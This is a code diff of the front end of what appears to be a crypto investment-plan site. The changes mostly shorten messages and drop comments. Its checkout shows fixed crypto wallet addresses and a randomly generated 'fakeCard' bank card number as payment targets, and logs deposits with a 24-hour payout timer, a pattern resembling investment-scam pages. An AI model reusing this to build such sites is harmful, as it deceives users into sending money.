-                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Ошибка при получении данных</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Ошибка</td></tr>';
             }
         }
 
         function viewUserDashboard(email) {
             document.getElementById('adminSection').style.display = 'none';
-            dashUserEmail.innerText = `${email} (Просмотр админа)`;
+            dashUserEmail.innerText = `${email} (Админ)`;
             loadUserData(email);
             toggleDashboard(true);
         }
@@ -1517,7 +1480,7 @@
             minLimit = min;
             maxLimit = max;
             modalTitle.innerText = `Plan: ${planName}`;
-            modalDesc.innerText = `Enter amount between $${min} and $${max}`;
+            modalDesc.innerText = `Enter amount ($${min} - $${max})`;
             investAmountInput.value = min;
             investAmountInput.min = min;
             investAmountInput.max = max;
@@ -1541,26 +1504,26 @@
         function proceedToCheckout(methodType) {
             const amount = parseFloat(investAmountInput.value);
             if (!amount || amount < minLimit || amount > maxLimit) {
-                alert(`Please enter a valid amount between $${minLimit} and $${maxLimit}`);
+                alert(`Введите сумму от $${minLimit} до $${maxLimit}`);
                 return;
             }
 
             if (methodType === 'USDT') {
-                currentMethodName = 'Криптокошелек (USDT TRC20)';
+                currentMethodName = 'USDT TRC20';
                 const addr = 'TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF';
                 currentMethodDetails = `<a href="https://tronscan.org/#/address/${addr}" target="_blank" style="color: var(--accent); text-decoration: underline;">${addr}</a>`;
             } else if (methodType === 'BTC') {
-                currentMethodName = 'Криптокошелек (Bitcoin)';
+                currentMethodName = 'Bitcoin';
                 const addr = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
                 currentMethodDetails = `<a href="https://www.blockchain.com/explorer/addresses/btc/${addr}" target="_blank" style="color: var(--accent); text-decoration: underline;">${addr}</a>`;
             } else if (methodType === 'ETH') {
-                currentMethodName = 'Криптокошелек (Ethereum)';
+                currentMethodName = 'Ethereum';
                 const addr = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
                 currentMethodDetails = `<a href="https://etherscan.io/address/${addr}" target="_blank" style="color: var(--accent); text-decoration: underline;">${addr}</a>`;
             } else {
                 currentMethodName = 'Банковская карта';
                 const fakeCard = '4276 ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' 5678';
-                currentMethodDetails = `<span style="font-family: monospace; letter-spacing: 1px; color: #fff;">${fakeCard}</span>`;
+                currentMethodDetails = `<span style="font-family: monospace; color: #fff;">${fakeCard}</span>`;
             }
 
             checkPlan.innerText = currentPlan;
@@ -1585,7 +1548,7 @@
             userData.totalInvested += amount;
             userData.activeDeposits += 1;
             
-            let futureTime = Date.now() + (24 * 60 * 60 * 1000); // 24 часа
+            let futureTime = Date.now() + (24 * 60 * 60 * 1000);
 
             userData.transactions.unshift({
                 type: 'DEPOSIT',
@@ -1625,7 +1588,6 @@
             }
         }
 
-        // Таймер обратного отсчета для депозитов
         setInterval(() => {
             const timers = document.querySelectorAll('.tx-timer');
             let email = localStorage.getItem('apex_logged_user');
